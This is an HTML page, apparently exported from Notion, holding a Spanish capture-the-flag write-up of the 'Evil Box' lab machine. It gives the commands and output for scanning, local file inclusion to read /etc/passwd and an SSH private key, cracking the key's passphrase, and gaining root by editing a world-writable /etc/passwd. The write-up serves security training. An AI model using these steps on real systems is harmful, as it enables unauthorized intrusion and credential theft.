@@ -1,0 +1,745 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Evil Box</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	text-indent: -1.7em;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-opaquegray { background-color: rgba(255, 255, 255, 0.0375); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body style="background-color: #CACFD2"><article id="1fc226e5-194c-4b99-83ac-f1fb884d3ebe" class="page sans"><header><img class="page-cover-image" src="https://www.notion.so/images/page-cover/met_winslow_homer_maine_coast.jpg" style="object-position:center 60%"/><div class="page-header-icon page-header-icon-with-cover"><img class="icon" src="https://www.notion.so/icons/package_lightgray.svg"/></div><h1 class="page-title">Evil Box</h1></header><div class="page-body"><h3 id="de576847-aee7-46c4-9ec4-3c6fed2ab108" class=""><mark class="highlight-blue">Intrusion</mark></h3><p id="7e939002-b44f-4a95-99e9-6f2d7df50e3c" class="">Empiezo haciendo un escaneo con nmap para ver puertos abiertos</p><pre id="c4edae4b-dbe0-46fa-9e52-8d1007628fd7" class="code"><code>❯ nmap 192.168.1.19
+Nmap scan report for 192.168.1.19
+Host is up (0.0024s latency).
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http</code></pre><figure id="25a4d453-d842-4cd1-84c5-b9d4a5b42056" class="image" style="text-align:left"><a href="Evil%20Box%201fc226e5194c4b9983acf1fb884d3ebe/Pasted_image_20230117182600.png"><img style="width:768px" src="Evil%20Box%201fc226e5194c4b9983acf1fb884d3ebe/Pasted_image_20230117182600.png"/></a></figure><p id="d64d25c8-bdf6-4228-90c5-f97b613be203" class="">Uso nikto para ver posibles vulnerabilidades o recursos en la página</p><pre id="f09a7f44-66d5-46e8-971a-a0424b566ad1" class="code"><code>❯ nikto -h http://192.168.1.19/
+---------------------------------------------------------------------------
++ Target IP:          192.168.1.19
++ Target Hostname:    192.168.1.19
++ Target Port:        80
++ Start Time:         2023-01-17 18:11:38 (GMT-3)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.38 (Debian)
++ &quot;robots.txt&quot; retrieved but it does not contain any &#x27;disallow&#x27; entries (which is odd).
++ OSVDB-3092: /secret/: This might be interesting...
++ OSVDB-3233: /icons/README: Apache default file found.
++ End Time:           2023-01-17 18:12:00 (GMT-3) (22 seconds)
+---------------------------------------------------------------------------</code></pre><p id="0c0bdf99-5b08-4c75-9e13-a3cbfe6651b7" class="">Me muestra un &quot;robots.txt&quot; un directorio &quot;<span style="border-bottom:0.05em solid">/secret/</span>&quot; y un &quot;<span style="border-bottom:0.05em solid">/icons/README</span>&quot;.</p><p id="54a996aa-87a4-4caf-9e74-395e775026b8" class="">Nada interesante en robots.txt y <span style="border-bottom:0.05em solid">/secret</span> por ahora</p><figure id="8c5c5103-1d59-4edc-acd8-c4c022bb30bb" class="image" style="text-align:left"><a href="Evil%20Box%201fc226e5194c4b9983acf1fb884d3ebe/Pasted_image_20230117183648.png"><img style="width:432px" src="Evil%20Box%201fc226e5194c4b9983acf1fb884d3ebe/Pasted_image_20230117183648.png"/></a></figure><p id="09c24ea2-e055-42aa-a6b6-ec7bcdafbba0" class="">
+</p><figure id="840b8ec8-1b08-44ff-acff-7467d294107b" class="image" style="text-align:left"><a href="Evil%20Box%201fc226e5194c4b9983acf1fb884d3ebe/Pasted_image_20230117183823.png"><img style="width:426px" src="Evil%20Box%201fc226e5194c4b9983acf1fb884d3ebe/Pasted_image_20230117183823.png"/></a></figure><p id="3aaeab68-b1ea-4c97-9a90-d37a42e1f838" class="">Después de hacer fuzzing de subdominios u otras rutas y no encontrar nada, busque por archivos php o txt en el directorio<span style="border-bottom:0.05em solid"> /secret/</span></p><pre id="faae654e-9c55-4919-b034-9791362b9952" class="code"><code>❯ gobuster dir -u http://192.168.1.19/secret/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 40 -x php,txt
+===============================================================
+Gobuster v3.1.0
+===============================================================
+[+] Url:                     http://192.168.1.19/secret/
+[+] Method:                  GET
+[+] Threads:                 40
+[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php,txt
+[+] Timeout:                 10s
+===============================================================
+/evil.php             (Status: 200) [Size: 0]
+
+===============================================================
+2023/01/17 19:05:06 Finished
+===============================================================</code></pre><p id="cc2ba2e0-d428-4b01-86fd-8d3b9d3b0735" class="">El recurso <strong>evil.php</strong> existe pero en la web todavía no muestra nada</p><figure id="25e29b27-a44b-45a3-af3b-9b2c457142c4" class="image" style="text-align:left"><a href="Evil%20Box%201fc226e5194c4b9983acf1fb884d3ebe/Pasted_image_20230117190744.png"><img style="width:542px" src="Evil%20Box%201fc226e5194c4b9983acf1fb884d3ebe/Pasted_image_20230117190744.png"/></a></figure><p id="d74e785a-389e-4545-9fc4-63e4d335295d" class="">Tiene pinta de ser un Local File Inclusion (LFI), por lo que lanzo otro escaneo para detectar algún parámetro web con el que pueda listar archivos locales de la maquina</p><pre id="05a39be0-13d8-4231-8680-0a0db5712f43" class="code"><code>❯ wfuzz -c --hc=404 --hw=0 -w /opt/SecLists/Miscellaneous/web/html-tags.txt &#x27;http://192.168.1.19/secret/evil.php?FUZZ=/etc/passwd&#x27; 2&gt;/dev/null
+********************************************************
+
+Target: http://192.168.1.19/secret/evil.php?FUZZ=/etc/passwd
+Total requests: 153
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                         
+=====================================================================
+
+000000032:   200        27 L     39 W       1458 Ch     &quot;command&quot;                                                                                       
+
+Total time: 0
+Processed Requests: 153
+Filtered Requests: 152
+Requests/sec.: 0</code></pre><p id="eb01e9b3-fedf-48d1-b3b6-e448f29f40f8" class=""><em>command</em> parece ser el parámetro para intentar un LFI</p><figure id="17148ac0-1002-482f-a5f4-e2fcce5f8027" class="image"><a href="Evil%20Box%201fc226e5194c4b9983acf1fb884d3ebe/Pasted_image_20230117192626.png"><img style="width:1326px" src="Evil%20Box%201fc226e5194c4b9983acf1fb884d3ebe/Pasted_image_20230117192626.png"/></a></figure><p id="fae34063-4953-4b10-8cf1-feade6d0ed46" class="">Funciona, por lo que ahora podemos probar ver la id_rsa de algún usuario del sistema</p><figure id="97017046-fdc6-4b38-93b7-2c44d30d841b" class="image" style="text-align:left"><a href="Evil%20Box%201fc226e5194c4b9983acf1fb884d3ebe/Pasted_image_20230117204123.png"><img style="width:816px" src="Evil%20Box%201fc226e5194c4b9983acf1fb884d3ebe/Pasted_image_20230117204123.png"/></a></figure><p id="dd63b8cb-60c4-4907-97f3-46ff82938180" class="">Vemos la del usuario <mark class="highlight-teal"><em>mowree</em></mark> pero está encriptada.</p><p id="624b75f3-102a-41c6-b7e8-ef5434f01aa4" class="">Con ssh2john podemos tratar de sacar la contraseña.</p><pre id="16e9076b-e693-487d-973b-008228dc489a" class="code"><code>❯ /usr/share/john/ssh2john.py id_rsa &gt; hash</code></pre><pre id="248490a9-5d37-4e0c-bd04-cc6cf7579e2f" class="code"><code>❯ john hash --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
+Cost 2 (iteration count) is 2 for all loaded hashes
+Will run 2 OpenMP threads
+Note: This format may emit false positives, so it will keep trying even after
+finding a possible candidate.
+Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status
+unicorn          (id_rsa)
+
+Session completed</code></pre><p id="242563a8-70c4-444c-b06a-1c9d05489d1c" class="">
+Tengo la contraseña de la id_rsa por lo que ahora puedo intentar conectarme por ssh ingresando la clave de la is_rsa pero sin poner la contraseña del usuario <mark class="highlight-teal"><em>mowree</em></mark></p><pre id="1149fb71-4f8f-4df7-9a32-ac3c462cfbb5" class="code"><code>❯ ssh mowree@192.168.1.19 -i id_rsa
+Enter passphrase for key &#x27;id_rsa&#x27;: 
+Linux EvilBoxOne 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64
+mowree@EvilBoxOne:~$ whoami
+mowree
+mowree@EvilBoxOne:~$</code></pre><p id="0842992f-d3c4-4ac4-8e3c-7dbcedfc1a0d" class="">
+</p><hr id="257613a4-30c6-435e-a63c-eea5bca45c54"/><p id="bd28ba22-86f6-4382-98ad-f1c48201341b" class="">
+</p><h3 id="8013cb40-2721-4cf7-bbfa-97827773e754" class=""><mark class="highlight-blue">Elevando Privilegios</mark></h3><p id="4046dc1b-21d6-46f4-997b-da68d71b6630" class="">
+</p><p id="fd1ff38c-3d98-4316-a7cb-01bca0633780" class="">Si listamos los permisos del archivo <span style="border-bottom:0.05em solid">/etc/passwd</span> vemos que otros pueden escribir</p><pre id="f5a5b90f-743f-4346-a181-879438d81e35" class="code"><code>mowree@EvilBoxOne:~$ ls -la /etc/passwd
+-rw-rw-rw- 1 root root 1398 Aug 16  2021 /etc/passwd</code></pre><p id="a8444a47-5cf4-45ab-9ee2-8ee5622d98aa" class="">Por lo que ahora podemos crear una contraseña para el usuario <mark class="highlight-red"><em>root</em></mark> y poner el hash en el <span style="border-bottom:0.05em solid">/etc/passwd</span></p><pre id="e4e5284f-58cb-443e-8ab3-99c77f74970e" class="code"><code>❯ openssl passwd -1
+Password: 
+Verifying - Password: 
+$1$eKwzP0P1$W4PsKYip9JqhXY2BAKMBe0</code></pre><p id="ebdb0ec0-3422-40c4-a4ce-b0e6a5d3d486" class="">Con openssl generamos el hash de la contraseña &quot;<mark class="highlight-yellow">password123</mark>” y lo cambiamos por la x en <span style="border-bottom:0.05em solid">/etc/passwd</span></p><figure id="89fc6bae-9bd3-4606-9725-72c67a9fb8b3" class="image" style="text-align:left"><a href="Evil%20Box%201fc226e5194c4b9983acf1fb884d3ebe/Pasted_image_20230118010249.png"><img style="width:672px" src="Evil%20Box%201fc226e5194c4b9983acf1fb884d3ebe/Pasted_image_20230118010249.png"/></a></figure><figure id="87046c54-e2d5-4194-9216-598d8351f35f" class="image" style="text-align:left"><a href="Evil%20Box%201fc226e5194c4b9983acf1fb884d3ebe/Pasted_image_20230118010342.png"><img style="width:340px" src="Evil%20Box%201fc226e5194c4b9983acf1fb884d3ebe/Pasted_image_20230118010342.png"/></a></figure><p id="37acd7cf-6680-42b8-a146-f2202d785051" class="">
+</p><p id="86377325-55df-480b-9dd6-fbb1baf8f0e3" class="">
+</p></div></article></body></html>
